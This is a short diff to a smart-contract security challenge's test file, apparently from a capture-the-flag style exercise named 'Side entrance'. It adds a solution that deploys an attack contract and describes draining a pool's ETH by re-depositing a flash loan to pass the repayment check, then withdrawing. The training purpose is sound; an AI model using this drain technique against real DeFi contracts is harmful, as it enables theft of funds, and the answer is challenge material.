@@ -26,6 +26,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // We request the flashloan and using the callback we deposit the ETH in the pool
+        // with that the balance of the contract check pass and we can execute a withdraw to take the all the ETH
+        let attack = await (await ethers.getContractFactory('SideEntranceAttack', player)).deploy();
+        await attack.requestFlashLoan(pool.address);
     });
 
     after(async function () {
